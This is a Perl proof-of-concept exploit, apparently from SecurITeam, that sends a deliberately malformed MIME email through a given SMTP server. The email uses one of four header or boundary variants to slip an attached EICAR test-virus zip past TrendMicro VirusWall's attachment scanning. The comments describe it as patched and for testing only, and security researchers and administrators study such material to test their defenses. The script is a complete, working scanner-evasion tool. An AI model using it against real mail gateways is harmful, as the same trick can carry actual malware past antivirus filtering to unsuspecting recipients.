#!/usr/bin/perl

# The following code generates a malformed email with an EICAR attachment(False Virus).
# The vulnerability has been found to be present in TrendMicro's VirusWall, and has been now patched.
# Refer to http://solutionbank.antivirus.com/solutions/solutionsearch.asp solution ID 11948
#
# BeyondSecurity's SecurITeam, Copyrighted Material, for Testing Purposes only. For more information see:
# http://www.securiteam.com/securitynews/5KP000A7QE.html

use Getopt::Std;
use IO::Socket::INET;

getopt('tfhvsb');

if (!$opt_f || !$opt_t || !$opt_h)
{
  print "Usage: malformed_email.pl <-t to> <-f from> <-h smtphost> [-v
variant] [-s subject] [-b text]\nVariants:\n(1) Content-Type\n(2) Content
Transfer Encoding\n(3) Boundary Space (trailing)\n(4) Boundary Space
(prefix)\n";
  exit;
}
$sock = IO::Socket::INET->new(PeerAddr => "$opt_h",PeerPort => '25', Proto
=> 'tcp');
unless (<$sock> =~ "220") { die "Not a SMTP Server?" }
print $sock "HELO you\r\n";
unless (<$sock> =~ "250") { die "HELO failed" }
print $sock "MAIL FROM:<$opt_f>\r\n";
unless (<$sock> =~ "250") { die "MAIL FROM failed" }
print $sock "RCPT TO:<$opt_t>\r\n";
unless (<$sock> =~ "250") { die "RCPT TO failed" }
print $sock "DATA\r\n";
unless (<$sock> =~ "354") { die "DATA failed" }

if ($opt_v eq "1")
{
 $content_type = "Content-Type :";
}
else
{
 $content_type = "Content-Type:";
}

if ($opt_v eq "2")
{
 $content_transfer_encoding = "Content-Transfer-Encoding :";
}
else
{
 $content_transfer_encoding = "Content-Transfer-Encoding:";
}

if ($opt_v eq "3")
{
 $boundary = "boundary=----=_NextPart_000_000E_01C2100B.F369D840 ";
}
else
{
 if ($opt_v eq "4")
 {
  $boundary = "boundary= ----=_NextPart_000_000E_01C2100B.F369D840";
 }
 else
 {
  $boundary = "boundary=\"----=_NextPart_000_000E_01C2100B.F369D840\"";
 }
}

print $sock <<EOF;
From: $opt_f
To: $opt_t
Subject: $opt_s
MIME-Version: 1.0
$content_type multipart/mixed;
  $boundary
X-Priority: 3
X-MSMail-Priority: Normal
X-Mailer: Microsoft Outlook Express 5.50.4807.1700
X-MimeOLE: Produced By Microsoft MimeOLE V5.50.4910.0300

This is a multi-part message in MIME format.

------=_NextPart_000_000E_01C2100B.F369D840
Content-Type: text/plain;
  charset="iso-8859-1"
Content-Transfer-Encoding: 7bit

$opt_b

------=_NextPart_000_000E_01C2100B.F369D840
$content_type application/x-zip-compressed;
  name="eicar_com.zip"
$content_transfer_encoding base64
Content-Disposition: attachment;
  filename="eicar_com.zip"

UEsDBAoAAAAAAOCYuCg8z1FoRAAAAEQAAAAJAAAAZWljYXIuY29tWDVPIVAlQEFQWzRcUFpYNTQo
UF4pN0NDKTd9JEVJQ0FSLVNUQU5EQVJELUFOVElWSVJVUy1URVNULUZJTEUhJEgrSCpQSwECFAAK
AAAAAADgmLgoPM9RaEQAAABEAAAACQAAAAAAAAABACAA/4EAAAAAZWljYXIuY29tUEsFBgAAAAAB
AAEANwAAAGsAAAAAAA==
------=_NextPart_000_000E_01C2100B.F369D840--
\n.\n
EOF

print "Finished sending data\n";
print "Variant #$opt_v\n";

$a = <$sock>;
print "$a\n";

close($sock);